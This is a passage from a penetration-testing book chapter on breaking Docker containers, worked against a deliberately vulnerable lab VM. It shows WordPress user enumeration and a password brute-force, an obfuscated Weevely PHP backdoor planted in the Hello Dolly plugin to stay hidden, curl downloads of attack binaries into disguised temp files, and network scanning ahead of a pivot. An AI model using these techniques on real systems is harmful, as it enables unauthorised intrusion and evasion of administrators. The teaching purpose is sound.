@@ -1,0 +1,373 @@
+<html><head></head><body><div class="chapter" title="Chapter&#xA0;13.&#xA0;Breaking Containers"><div class="titlepage"><div><div><h1 class="title"><a id="ch13"/>Chapter 13. Breaking Containers</h1></div></div></div><p>In this chapter, we will look at attacking application containers. Docker<a id="id671" class="indexterm"/> is by far the most popular container management system and is more likely to be deployed by enterprises than other  such systems. We will examine how misconfigurations, assumptions, and insecure deployments can lead to <a id="id672" class="indexterm"/>full compromise of not only the target, but adjacent applications as well.</p><div class="blockquote"><blockquote class="blockquote"><p>"A Docker container image is a lightweight, standalone, executable package of software that includes everything needed to run an application: code, runtime, system tools, system libraries and settings. [...] Available for both Linux and Windows-based applications, containerized software will always run the same, regardless of the infrastructure. Containers isolate software from its environment and ensure that it works uniformly despite differences for instance between development and staging."</p><p>                                                                                                                    - Docker</p></blockquote></div><p>Without context, the preceding quote could be describing <span class="strong"><strong>virtual machines</strong></span> (<span class="strong"><strong>VMs</strong></span>). After all, we can package applications inside a VM and deploy them on any host without fear of conflict. There are, however, some fundamental differences between VMs and containers. What is of interest to the attacker is the isolation or lack thereof.</p><p>This chapter will:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem" style="list-style-type: disc">Describe Docker and Linux containers</li><li class="listitem" style="list-style-type: disc">Show how Docker applications differ from traditional applications</li><li class="listitem" style="list-style-type: disc">Abuse Docker to compromise the target application and eventually the host</li></ul></div><p>The following figure illustrates how containers can run full application stacks adjacent to each other without conflict. A notable difference between this and the traditional VM is the kernel component. Containers are possible because of the ability to<a id="id673" class="indexterm"/> isolate processes <a id="id674" class="indexterm"/>using <span class="strong"><strong>control groups</strong></span> (<span class="strong"><strong>cgroups</strong></span>) and <span class="strong"><strong>namespaces</strong></span>.</p><p>Containers have been described as <span class="strong"><strong>chroot</strong></span> on steroids. Chroot is the Unix application that allows administrators to effectively<a id="id675" class="indexterm"/> change what a running application "thinks" the root of the filesystem is. The chroot directory is made to resemble the actual root of the filesystem, providing the application with any file paths that it may need to operate properly. The application is confined (chrooted) to this arbitrary subdirectory, which it perceives as the root filesystem. In the event the application breaks, it cannot corrupt shared system files or libraries, since it only has access to copies of the original.</p><div class="mediaobject"><img src="graphics/B09238_13_01.jpg" alt="Breaking Containers"/><div class="caption"><p>Figure 13.1: Containers running full application stacks (source: Docker)</p></div></div><p>When an application is isolated using a container, it should not be able to see or interact with other processes running on the same host. It does, however, share kernel resources with other containers on the same machine. This is important to remember, as exploiting a kernel vulnerability in the container affects the host and adjacent applications as well. Exploiting the kernel inside a VM generally does not compromise other VMs running on the same hardware. To attack other VMs, you would need very expensive and very rare virtual environment host (hypervisor) escape exploits.</p><p>In <a id="id676" class="indexterm"/>the following figure, you can see the difference between<a id="id677" class="indexterm"/> Docker containers and traditional hypervisors (VM software), such as VMware, Hyper-V, or VirtualBox:</p><div class="mediaobject"><img src="graphics/B09238_13_02.03_merged.jpg" alt="Breaking Containers"/><div class="caption"><p>Figure 13.2: The difference between Docker containers and traditional hypervisors (source: Docker)</p></div></div><p>The Docker daemon runs <a id="id678" class="indexterm"/>on the host operating system and abstracts<a id="id679" class="indexterm"/> the application layer, while hypervisors abstract the hardware layer. So, why deploy containers when they don't completely isolate applications? The simple answer is cost. Containers are lightweight, easy to build and deploy, and provide enough isolation that they remove application layer conflicts. This solves the problem of "it works in my environment," which so many developers struggle with today.</p><p>An application runs exactly the same on the developer's machine as it does in production or on a completely different Linux distribution. You can even run containers packaged on Linux on the latest versions of Windows. The portability and the agility that containers and Docker provide is hard to argue against. While VMs can accomplish the same thing, in order for an application to run successfully on the VM, it needs a full operating system. The disk space and CPU requirements, and overall performance costs, can add up.</p><p>As mentioned, Docker <a id="id680" class="indexterm"/>is not the only container technology, but<a id="id681" class="indexterm"/> it is by far the most popular. Docker is essentially an easy way to manage cgroups and namespaces. Cgroups are a Linux kernel feature and provide isolation for computer resources, such as CPU, network, and disk input/output operations. Docker also provides the centralized Docker Hub, which the community can use to upload their own container images and share them with the world.</p><p>The Docker model implements a client server architecture, which essentially translates into the Docker daemon orchestrating containers on the host, and the client controlling the daemon through an API that the daemon exposes.</p><div class="section" title="Vulnerable Docker scenario"><div class="titlepage"><div><div><h1 class="title"><a id="ch13lvl1sec69"/>Vulnerable Docker scenario</h1></div></div></div><p>As<a id="id682" class="indexterm"/> powerful as Docker and container technology is, it can sometimes introduce complexity into the application lifecycle and that does not typically bode well for security. The ability to quickly deploy, test, and develop applications at scale certainly has its benefits but can easily let security vulnerabilities slip through the cracks.</p><p>Software is only as secure as its configuration. If an application is unpatched or not properly locked down, it increases the attack surface and the likelihood of compromise significantly. Docker is no different and the default configuration is usually not enough. We're here to exploit these configuration issues and deployment mistakes.</p><p>Compromising an application running in a container is one thing, but escalating privilege to the host can be the icing on the cake. To illustrate the impact of poorly configured and insecurely deployed Docker containers, we will use <a id="id683" class="indexterm"/>NotSoSecure's <span class="strong"><strong>Vulnerable Docker VM</strong></span>. This is a well-put-together VM, which showcases some critical, yet common, issues with Docker deployment.</p><div class="note" title="Note" style=""><div class="inner"><h3 class="title"><a id="note80"/>Note</h3><p>The VM package is available for download on NotSoSecure's site: <a class="ulink" href="https://www.notsosecure.com/vulnerable-docker-vm/">https://www.notsosecure.com/vulnerable-docker-vm/</a>.</p></div></div><p>Once the VM is up and<a id="id684" class="indexterm"/> running, the console screen will display its DHCP-issued IP address. For the sake of clarity, we will use <code class="literal">vulndocker.internal</code> as the domain pointing to the Docker instance:</p><div class="mediaobject"><img src="graphics/B09238_13_04.jpg" alt="Vulnerable Docker scenario"/><div class="caption"><p>Figure 13.3: Vulnerable Docker VM login prompt</p></div></div><p>The application is running inside a container provided by the Docker host <code class="literal">vulndocker.internal</code> on port <code class="literal">8000</code>. In a real-world scenario, we'd see the application exposed on common ports, such as <code class="literal">80</code> or <code class="literal">443</code>. Typically, an NGINX (or similar) will proxy HTTP traffic between the contained application and the attacker, hiding some of the other ports that the Docker <a id="id685" class="indexterm"/>host would normally have open. An attacker would have to focus on application vulnerabilities in order to gain access to the Docker host.</p></div></div>
+<div class="section" title="Foothold"><div class="titlepage"><div><div><h1 class="title"><a id="ch13lvl1sec70"/>Foothold</h1></div></div></div><p>Interacting with the web application <a id="id686" class="indexterm"/>provided by the Docker VM, we notice it is running a WordPress instance:</p><div class="mediaobject"><img src="graphics/B09238_13_05.jpg" alt="Foothold"/><div class="caption"><p>Figure 13.4: WordPress application served by the VM</p></div></div><p>The next step in our attack will be running the <code class="literal">wpscan</code> tool and looking for any low-hanging fruit, and gathering as much information about the instance as possible.</p><div class="note" title="Note" style=""><div class="inner"><h3 class="title"><a id="note81"/>Note</h3><p>The <code class="literal">wpscan</code> tool<a id="id687" class="indexterm"/> is available on Kali and almost any other penetration-testing-focused distribution. The latest version can be pulled from <a class="ulink" href="https://github.com/wpscanteam/wpscan">https://github.com/wpscanteam/wpscan</a>.</p></div></div><p>We can start our attack by <a id="id688" class="indexterm"/>issuing a <code class="literal">wpscan</code> command in the attack machine terminal. By default, passive detection will be enabled to look for available plugins, as well as various other rudimentary checks. We can point the scanner to our application using the <code class="literal">--url</code> switch, passing the full URL, including the port <code class="literal">8000</code>, as the value.</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>root@kali:~# wpscan --url http://vulndocker.internal:8000/</strong></span>
+<span class="strong"><strong>[+] robots.txt available under: 'http://vulndocker.internal:8000/robots.txt'</strong></span>
+<span class="strong"><strong>[+] Interesting entry from robots.txt: http://vulndocker.internal:8000/wp-admin/admin-ajax.php</strong></span>
+<span class="strong"><strong>[!] The WordPress 'http://vulndocker.internal:8000/readme.html' file exists exposing a version number</strong></span>
+<span class="strong"><strong>[!] Full Path Disclosure (FPD) in 'http://vulndocker.internal:8000/wp-includes/rss-functions.php': </strong></span>
+<span class="strong"><strong>[+] Interesting header: LINK: &lt;http://vulndocker.internal:8000/wp-json/&gt;; rel="https://api.w.org/"</strong></span>
+<span class="strong"><strong>[+] Interesting header: SERVER: Apache/2.4.10 (Debian)</strong></span>
+<span class="strong"><strong>[+] Interesting header: X-POWERED-BY: PHP/5.6.31</strong></span>
+<span class="strong"><strong>[+] XML-RPC Interface available under: http://vulndocker.internal:8000/xmlrpc.php</strong></span>
+
+<span class="strong"><strong>[+] Enumerating plugins from passive detection ...</strong></span>
+<span class="strong"><strong>[+] No plugins found</strong></span>
+</pre></div><p>The scan results for this instance are pretty dry. The <span class="strong"><strong>Full Path Disclosure</strong></span> (<span class="strong"><strong>FPD</strong></span>) vulnerability may come in handy if we have to blindly drop a shell on disk through a MySQL instance (as we've done in previous chapters), or if we find a local file inclusion vulnerability. The <span class="strong"><strong>XML-RPC</strong></span> interface appears to be available, which may come in handy a little later. For now, we will make a note of these findings.</p><p>There are seemingly endless plugins for WordPress and most of the WordPress-related breaches come from outdated and vulnerable plugins. In our case, however, this simple blog does not use any visible plugins. The default <code class="literal">wpscan</code> plugin enumeration is passive; if a plugin is installed but not in use, it may not be detected. There is an option to actively test for the existence of plugins using a predefined database of known plugins.</p><p>To begin an active scan of all known WordPress plugins, we can use the <code class="literal">--enumerate</code> switch, specifying the <code class="literal">p</code> value when running <code class="literal">wpscan</code>:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>root@kali:~# wpscan --url http://vulndocker.internal:8000/ --enumerate p</strong></span>
+</pre></div><p>This scan will run for a few minutes but in this scenario, it does not return anything interesting. <code class="literal">wpscan</code> can also use some effective information disclosure techniques in WordPress, which can reveal some of the post authors and their respective login usernames. Enumerating users will be the next activity and hopefully we can attack the admin account, and move up to shell access.</p><p>To begin a username <a id="id689" class="indexterm"/>enumeration, we can use the <code class="literal">--enumerate</code> switch, this time with the <code class="literal">u</code> value specified:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>root@kali:~# wpscan --url http://vulndocker.internal:8000/ --enumerate u</strong></span>
+<span class="strong"><strong>[...]</strong></span>
+<span class="strong"><strong>[+] Enumerating usernames ...</strong></span>
+<span class="strong"><strong>[+] Identified the following 1 user/s:</strong></span>
+<span class="strong"><strong>    +----+-------+-----------------+</strong></span>
+<span class="strong"><strong>    | Id | Login | Name            |</strong></span>
+<span class="strong"><strong>    +----+-------+-----------------+</strong></span>
+<span class="strong"><strong>    | 1  | bob   | bob – NotSoEasy |</strong></span>
+<span class="strong"><strong>    +----+-------+-----------------+</strong></span>
+</pre></div><p>The user enumeration returned one value: <code class="literal">bob</code>. With the ID of <code class="literal">1</code>, we can safely assume this is the administrative account. Bob will be the focus of our brute-force attack and since we've had success with the <code class="literal">10-million-password-list-</code> wordlists before, we will try them here as well.</p><p>The <code class="literal">wpscan</code> tool provides a login brute-forcing option through the <code class="literal">--passwords</code> and <code class="literal">--usernames</code> parameters. Not to be outdone by other tools, Metasploit also provides a brute-forcer for WordPress logins via the XML-RPC interface. For bigger engagements, it may be worthwhile to use this module instead, as the Metasploits database could come in handy for organizing findings and launching subsequent attacks quickly.</p><p>For our purposes, the brute-forcer of <code class="literal">wpscan</code> is sufficient and we can let it fly:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong># wpscan --url http://vulndocker.internal:8000/ --passwords ~/tools/SecLists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt --usernames bob</strong></span>
+
+<span class="strong"><strong>[...]</strong></span>
+<span class="strong"><strong>[+] Starting the password brute forcer</strong></span>
+<span class="strong"><strong>  Brute Forcing 'bob' Time: 00:01:23 &lt;====              &gt; (2916 / 10001) 29.15%  ETA: 00:03:22</strong></span>
+
+<span class="strong"><strong>  [+] [SUCCESS] Login : bob Password : Welcome1</strong></span>
+
+<span class="strong"><strong>  +----+-------+------+----------+</strong></span>
+<span class="strong"><strong>  | Id | Login | Name | Password |</strong></span>
+<span class="strong"><strong>  +----+-------+------+----------+</strong></span>
+<span class="strong"><strong>  |    | bob   |      | Welcome1 |</strong></span>
+<span class="strong"><strong>  +----+-------+------+----------+</strong></span>
+</pre></div><p>Using the same<a id="id690" class="indexterm"/> parameters for the Metasploit <code class="literal">auxiliary/scanner/http/wordpress_xmlrpc_login</code> module, we produce the same results.</p><p>We can start the Metasploit console using the <code class="literal">msfconsole</code> command in the Linux terminal:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>root@kali:~# msfconsole -q</strong></span>
+<span class="strong"><strong>msf &gt;</strong></span>
+</pre></div><p>As we've done in previous chapters, we can load the <code class="literal">wordpress_xmlrpc_login</code> module with the <code class="literal">use</code> command:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>msf &gt; use auxiliary/scanner/http/wordpress_xmlrpc_login</strong></span>
+</pre></div><p>Similar to the MySQL login scanning module from earlier chapters, this particular module can be configured by specifying the following options:</p><div class="mediaobject"><img src="graphics/B09238_13_06.jpg" alt="Foothold"/><div class="caption"><p>Figure 13.5: Metasploit module options</p></div></div><p>For this particular brute-force attack, we will target the discovered user <code class="literal">bob</code> with our selected dictionary. We will also increase the <code class="literal">THREADS</code> to <code class="literal">10</code> and make sure the <code class="literal">RHOSTS</code> and <code class="literal">RPORT</code> reflect the target application. To set each option, we will use the (you guessed it) <code class="literal">set</code> command as shown:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>msf auxiliary(wordpress_xmlrpc_login) &gt; set RPORT 8000</strong></span>
+<span class="strong"><strong>msf auxiliary(wordpress_xmlrpc_login) &gt; set RHOSTS vulndocker.internal</strong></span>
+<span class="strong"><strong>msf auxiliary(wordpress_xmlrpc_login) &gt; set PASS_FILE /root/tools/SecLists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt</strong></span>
+<span class="strong"><strong>msf auxiliary(wordpress_xmlrpc_login) &gt; set USER bob</strong></span>
+<span class="strong"><strong>msf auxiliary(wordpress_xmlrpc_login) &gt; set THREADS 10</strong></span>
+<span class="strong"><strong>msf auxiliary(wordpress_xmlrpc_login) &gt; set STOP_ON_SUCCESS true</strong></span>
+</pre></div><p>With the module configured, we can<a id="id691" class="indexterm"/> launch the brute-force attack using the Metasploit <code class="literal">run</code> command:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>msf auxiliary(wordpress_xmlrpc_login) &gt; run</strong></span>
+
+<span class="strong"><strong>[*] vulndocker.internal:8000   :/xmlrpc.php - Sending Hello...</strong></span>
+<span class="strong"><strong>[*] Starting XML-RPC login sweep...</strong></span>
+<span class="strong"><strong>[+] WORDPRESS_XMLRPC - Success: 'bob:Welcome1'</strong></span>
+<span class="strong"><strong>[*] Scanned 1 of 1 hosts (100% complete)</strong></span>
+<span class="strong"><strong>[*] Auxiliary module execution completed</strong></span>
+</pre></div><p>While it is more steps to execute the Metasploit module, as opposed to just running <code class="literal">wpscan</code>, the value comes, once again, from Metasploit's ability to organize the data gathered during an attack. If this application is part of a larger engagement and the discovered credentials can be used in subsequent attacks, the Metasploit database is invaluable. With these credentials in hand, we have full access to the WordPress application.</p><p>Metasploit also provides the <code class="literal">exploit/unix/webapp/wp_admin_shell_upload</code> module, which will create a WordPress plugin that will connect back to the attacker using the <code class="literal">php/meterpreter/reverse_tcp</code> payload on port 4444 by default. There are other payload options, but the end result is essentially the same. There is one issue with the Metasploit module, however: noise. A failed or interrupted exploit attempt will leave behind incriminating artifacts. A wandering administrator would quickly notice these and raise the alarm. Can you spot the malicious plugin? Of course, you can.</p><p>The following figure shows the installed WordPress plugins, including the leftover MSF payload:</p><div class="mediaobject"><img src="graphics/B09238_13_07.jpg" alt="Foothold"/><div class="caption"><p>Figure 13.6: WordPress plugins</p></div></div><p>If we are trying to stay under the radar and avoid detection, we can opt for a more manual approach. Since we have full control over the CMS, we can create a custom plugin and upload it, just as Metasploit has done, or better yet, we can backdoor existing ones.</p><p>To keep things interesting, we <a id="id692" class="indexterm"/>will go the backdoor route and leverage Weevely again, since it provides a safe and hard-to-detect shell. We will execute the <code class="literal">weevely generate</code> command and inspect the contents of the newly created <code class="literal">shell.php</code> file as follows:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>root@kali:~# weevely generate Dock3r%Knock3r ~/tools/shell.php</strong></span>
+<span class="strong"><strong>Generated backdoor with password 'Dock3r%Knock3r' in '/root/tools/shell.php' of 1466 byte size.</strong></span>
+<span class="strong"><strong>root@kali:~# cat /root/tools/shell.php </strong></span>
+<span class="strong"><strong>&lt;?php</strong></span>
+<span class="strong"><strong>$D=str_replace('Gx','','creGxatGxGxe_fGxGxunctGxion');</strong></span>
+<span class="strong"><strong>[...]</strong></span>
+<span class="strong"><strong>$V=$D('',$J);$V();</strong></span>
+<span class="strong"><strong>?&gt;</strong></span>
+</pre></div><p>For this scenario, we won't be uploading the PHP shell to disk and accessing it directly. Instead, we will modify an existing file and inject the contents somewhere inside. There are several options available to us, but we will go with the Hello Dolly plugin, which ships with WordPress. The WordPress admin panel provides a <span class="strong"><strong>Plugins</strong></span> &gt; <span class="strong"><strong>Editor</strong></span> function, which allows the modification of plugin PHP code. Attackers love applications that have this feature, as it makes everyone's life much easier.</p><p>Our target is the <code class="literal">hello.php</code> file from<a id="id693" class="indexterm"/> the Hello Dolly plugin. The majority of its contents will be replaced by the generated <code class="literal">weevely shell.php</code> file, as shown in the following figure:</p><div class="mediaobject"><img src="graphics/B09238_13_08.jpg" alt="Foothold"/><div class="caption"><p>Figure 13.7: Replacing the contents of the hello.php file</p></div></div><div class="note" title="Note" style=""><div class="inner"><h3 class="title"><a id="note82"/>Note</h3><p>Remember our ROE. If you are modifying application files, take extra care not to cause extended outages in production environments. Always make backups and revert changes as soon as the engagement ends, or there is a noticeable impact to legitimate users of the application.</p></div></div><p>It's probably a good idea to<a id="id694" class="indexterm"/> leave the header intact, in case any passing administrators glance at the plugin. We can also leave most of the file intact, as long as it doesn't produce any unwanted error messages. PHP warnings and parse errors will interfere with Weevely and the backdoor will not work. We've seen that the <code class="literal">wpscan</code> results suggest that this application does not suppress error messages. For the sake of stealth, we have to remember this going forward.</p><p>In the preceding code block, we have closed the <code class="literal">&lt;?php</code> tag with <code class="literal">?&gt;</code> before pasting in the Weevely shell contents. Once the file is updated successfully, the Weevely shell can be accessed via the URL, <code class="literal">http://vulndocker.internal:8000/wp-content/plugins/hello.php</code>:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>root@kali:~/tools# weevely http://vulndocker.internal:8000/wp-content/plugins/hello.php Dock3r%Knock3r</strong></span>
+
+<span class="strong"><strong>[+] weevely 3.2.0</strong></span>
+
+<span class="strong"><strong>[+] Target:    www-data@8f4bca8ef241:/var/www/html/wp-content/plugins</strong></span>
+<span class="strong"><strong>[+] Session:/root/.weevely/sessions/vulndocker.internal/hello_0.session</strong></span>
+<span class="strong"><strong>[+] Shell:    System shell</strong></span>
+
+<span class="strong"><strong>[+] Browse the filesystem or execute commands starts the </strong></span>
+<span class="strong"><strong>[+] connection to the target. Type :help for more information.</strong></span>
+
+<span class="strong"><strong>weevely&gt; uname -a</strong></span>
+<span class="strong"><strong>Linux 8f4bca8ef241 3.13.0-128-generic #177-Ubuntu SMP x86_64 GNU/Linux</strong></span>
+<span class="strong"><strong>www-data@8f4bca8ef241:/var/www/html/wp-content/plugins $ </strong></span>
+</pre></div><p>Now that we have shell access to the application server, we can check to see if this is indeed a container by inspecting the <code class="literal">/proc/1/cgroup</code> file:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>weevely&gt; cat /proc/1/cgroup</strong></span>
+<span class="strong"><strong>11:name=systemd:/docker/8f4bca8ef241501721a6d88b3c1a9b7432f19b2d4b389a11bfe68b770366a669</strong></span>
+<span class="strong"><strong>10:hugetlb:/docker/8f4bca8ef241501721a6d88b3c1a9b7432f19b2d4b389a11bfe68b770366a669</strong></span>
+<span class="strong"><strong>9:perf_event:/docker/8f4bca8ef241501721a6d88b3c1a9b7432f19b2d4b389a11bfe68b770366a669</strong></span>
+<span class="strong"><strong>8:blkio:/docker/8f4bca8ef241501721a6d88b3c1a9b7432f19b2d4b389a11bfe68b770366a669</strong></span>
+<span class="strong"><strong>7:freezer:/docker/8f4bca8ef241501721a6d88b3c1a9b7432f19b2d4b389a11bfe68b770366a669</strong></span>
+<span class="strong"><strong>6:devices:/docker/8f4bca8ef241501721a6d88b3c1a9b7432f19b2d4b389a11bfe68b770366a669</strong></span>
+<span class="strong"><strong>5:memory:/docker/8f4bca8ef241501721a6d88b3c1a9b7432f19b2d4b389a11bfe68b770366a669</strong></span>
+<span class="strong"><strong>4:cpuacct:/docker/8f4bca8ef241501721a6d88b3c1a9b7432f19b2d4b389a11bfe68b770366a669</strong></span>
+<span class="strong"><strong>3:cpu:/docker/8f4bca8ef241501721a6d88b3c1a9b7432f19b2d4b389a11bfe68b770366a669</strong></span>
+<span class="strong"><strong>2:cpuset:/docker/8f4bca8ef241501721a6d88b3c1a9b7432f19b2d4b389a11bfe68b770366a669</strong></span>
+</pre></div><p>As another way to confirm that the application is running inside a container, we can look at the process list. In typical Linux environments, <span class="strong"><strong>process ID</strong></span> (<span class="strong"><strong>PID</strong></span>) <code class="literal">1</code> belongs to the <code class="literal">init</code>, <code class="literal">systemd</code>, or a similar daemon. Since containers are minimal environments, the first process listed is the <a id="id695" class="indexterm"/>daemon responsible for providing access to the application. In the case of web applications, <code class="literal">apache2</code>, <code class="literal">httpd</code>, <code class="literal">nginx</code>, or <code class="literal">nodejs</code> binaries are commonly assigned PID <code class="literal">1</code>:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>weevely&gt; ps 1</strong></span>
+<span class="strong"><strong>  PID TTY      STAT   TIME COMMAND</strong></span>
+<span class="strong"><strong>    1 ?        Ss     0:01 apache2 -DFOREGROUND</strong></span>
+</pre></div></div>
+<div class="section" title="Situational awareness"><div class="titlepage"><div><div><h1 class="title"><a id="ch13lvl1sec71"/>Situational awareness</h1></div></div></div><p>Now that we have access to the shell of the <a id="id696" class="indexterm"/>Docker container, we should look around and see what else we can find. As we've mentioned before, Docker containers are not VMs. They contain just enough binaries for the application to function.</p><p>Since we have shell access on the container, we are constrained to the environment it provides. If the application doesn't rely on <code class="literal">ifconfig</code>, for example, it will likely not be packaged with the container and therefore would be unavailable to us now.</p><p>We can confirm that our environment is somewhat limited by calling:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>weevely&gt; ifconfig</strong></span>
+<span class="strong"><strong>sh: 1: ifconfig: not found</strong></span>
+<span class="strong"><strong>weevely&gt; wget</strong></span>
+<span class="strong"><strong>sh: 1: wget: not found</strong></span>
+<span class="strong"><strong>weevely&gt; nmap</strong></span>
+<span class="strong"><strong>sh: 1: nmap: not found</strong></span>
+</pre></div><p>We do, however, have access to <code class="literal">curl</code>, which we can use in place of <code class="literal">wget</code>:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>weevely&gt; curl</strong></span>
+<span class="strong"><strong>curl: try 'curl --help' or 'curl --manual' for more information</strong></span>
+</pre></div><p>In the worst-case scenario, we could also upload the binaries through Weevely's <code class="literal">:file_upload</code> command.</p><p>To move around the container and its <a id="id697" class="indexterm"/>network, we do need access to binaries, such as <code class="literal">nmap</code> and <code class="literal">ncat</code>, and thankfully, these are available in a neatly organized GitHub repository. User andrew-d maintains the <span class="strong"><strong>static-binaries</strong></span> <a id="id698" class="indexterm"/>repository over on <a class="ulink" href="https://github.com/andrew-d/static-binaries/">https://github.com/andrew-d/static-binaries/</a>:</p><div class="mediaobject"><img src="graphics/B09238_13_09.jpg" alt="Situational awareness"/><div class="caption"><p>Figure 13.8: We're interested in the binaries/linux/x86_64 folder specifically</p></div></div><p>Since the container does not have the <code class="literal">nmap</code> binary available, we can download it with <code class="literal">curl</code> and make it executable with <code class="literal">chmod</code>. We'll use <code class="literal">/tmp/sess_[random]</code> as the filename template, to try and blend <a id="id699" class="indexterm"/>in as dummy session files, in case any administrator is glancing through the system temp folder:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>weevely &gt; curl https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/nmap -o /tmp/sess_IWxvbCBwaHAgc2Vzc2lvbnMu</strong></span>
+<span class="strong"><strong>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</strong></span>
+<span class="strong"><strong>                                 Dload  Upload   Total   Spent    Left  Speed</strong></span>
+<span class="strong"><strong>100 5805k  100 5805k    0     0   669k      0  0:00:08  0:00:08 --:--:-- 1465k</strong></span>
+<span class="strong"><strong>weevely &gt; chmod +x /tmp/sess_IWxvbCBwaHAgc2Vzc2lvbnMu</strong></span>
+<span class="strong"><strong>weevely &gt; </strong></span>
+</pre></div><p>We can also upload <code class="literal">ifconfig</code> from the attacker machine using Weevely's <code class="literal">:file_upload</code> command, since the container does not have this binary either. We have a local copy of <code class="literal">ifconfig</code> that will work just fine, which we will upload to the target system's <code class="literal">/tmp</code> folder under a dummy name:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>weevely &gt; :file_upload /sbin/ifconfig /tmp/sess_IWxvbCB3aGF0J3MgdXAgZG9j</strong></span>
+</pre></div><p>Just as with the <code class="literal">nmap</code>, we have to make the file an executable using <code class="literal">chmod</code> and the <code class="literal">+x</code> parameter:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>weevely &gt; chmod +x /tmp/sess_IWxvbCB3aGF0J3MgdXAgZG9j</strong></span>
+</pre></div><p>Now that we have some tools, we can get our bearings by running the recently uploaded <code class="literal">ifconfig</code> command:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>weevely &gt; /tmp/sess_IWxvbCB3aGF0J3MgdXAgZG9j</strong></span>
+<span class="strong"><strong>eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</strong></span>
+<span class="strong"><strong>        inet 172.18.0.4</strong></span>
+<span class="strong"><strong>  netmask 255.255.0.0  broadcast 0.0.0.0</strong></span>
+<span class="strong"><strong>        ether 02:42:ac:12:00:04  txqueuelen 0  (Ethernet)</strong></span>
+<span class="strong"><strong>        RX packets 413726  bytes 90828932 (86.6 MiB)</strong></span>
+<span class="strong"><strong>        RX errors 0  dropped 0  overruns 0  frame 0</strong></span>
+<span class="strong"><strong>        TX packets 342415  bytes 54527687 (52.0 MiB)</strong></span>
+<span class="strong"><strong>        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</strong></span>
+<span class="strong"><strong>[...]</strong></span>
+</pre></div><p>Recall that a Docker container employs its own internal network, separate from the host's network. Unless otherwise specified, by default, neighboring applications housed in other containers will join the same network. In this case, the <code class="literal">172.18.0.0/16</code> network is reachable through the <code class="literal">eth0</code> interface. This could provide a path to other applications that may be in scope for our engagement.</p><p>Now that we have an idea of what to look at, we <a id="id700" class="indexterm"/>can call up the <code class="literal">nmap</code> binary (<code class="literal">/tmp/sess_IWxvbCBwaHAgc2Vzc2lvbnMu</code>) to do a quick service scan on the container network:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>weevely &gt; /tmp/sess_IWxvbCBwaHAgc2Vzc2lvbnMu -p1- 172.18.0.0/24 </strong></span>
+<span class="strong"><strong>[...]</strong></span>
+<span class="strong"><strong>Nmap scan report for 172.18.0.1</strong></span>
+<span class="strong"><strong>Host is up (0.00079s latency).</strong></span>
+<span class="strong"><strong>Not shown: 65534 closed ports</strong></span>
+<span class="strong"><strong>PORT     STATE SERVICE</strong></span>
+<span class="strong"><strong>22/tcp   open  ssh</strong></span>
+<span class="strong"><strong>8000/tcp open  unknown</strong></span>
+
+<span class="strong"><strong>Nmap scan report for content_ssh_1.content_default (172.18.0.2)</strong></span>
+<span class="strong"><strong>Host is up (0.00056s latency).</strong></span>
+<span class="strong"><strong>Not shown: 65534 closed ports</strong></span>
+<span class="strong"><strong>PORT     STATE SERVICE</strong></span>
+<span class="strong"><strong>22/tcp   open  ssh</strong></span>
+<span class="strong"><strong>8022/tcp open  unknown</strong></span>
+
+<span class="strong"><strong>Nmap scan report for content_db_1.content_default (172.18.0.3)</strong></span>
+<span class="strong"><strong>Host is up (0.00038s latency).</strong></span>
+<span class="strong"><strong>Not shown: 65535 closed ports</strong></span>
+<span class="strong"><strong>PORT     STATE SERVICE</strong></span>
+<span class="strong"><strong>3306/tcp open  mysql</strong></span>
+
+<span class="strong"><strong>Nmap scan report for 8f4bca8ef241 (172.18.0.4)</strong></span>
+<span class="strong"><strong>Host is up (0.000090s latency).</strong></span>
+<span class="strong"><strong>Not shown: 65535 closed ports</strong></span>
+<span class="strong"><strong>PORT   STATE SERVICE</strong></span>
+<span class="strong"><strong>80/tcp open  http</strong></span>
+
+<span class="strong"><strong>Nmap done: 256 IP addresses (4 hosts up) scanned in 8.97 seconds</strong></span>
+</pre></div><p>The <code class="literal">172.18.0.1</code> IP appears to be the Docker host and the SSH service is protected. The MySQL service on <code class="literal">172.18.0.3</code> also looks interesting, but it may not be easily exploitable. This is likely the database used by the WordPress application.</p><p>We could go back and grab the credentials from <code class="literal">wp-config.php</code> and attempt to dump the data, but we may be limited in what we can do on the system with SQL access alone. If our goal is to break out of the container and gain access to the host, we may have to try a different attack path. It doesn't hurt to save those credentials until the end of the test. We may need to brute-force another set of credentials and password reuse is common.</p><p>The <code class="literal">content_ssh_1</code> container also stands out, but before we do anything else, let's upgrade our Weevely shell to a more robust Meterpreter session. Meterpreter also mimics the functionality of many Linux binaries that may not be available, making our job a little easier. Meterpreter<a id="id701" class="indexterm"/> is <a id="id702" class="indexterm"/>more a piece of malware that will allow us to easily pivot around the Docker host and its containers. </p><p>Pivoting is the technique used to tunnel traffic through an already compromised host to reach an otherwise unreachable target. Since we've compromised the container hosting the blog platform, we can use it as a pivot point to attack other adjacent containers or even the host itself.</p><p>On the attacker machine in the Linux terminal, we can use <span class="strong"><strong>MSFvenom</strong></span> to generate a simple 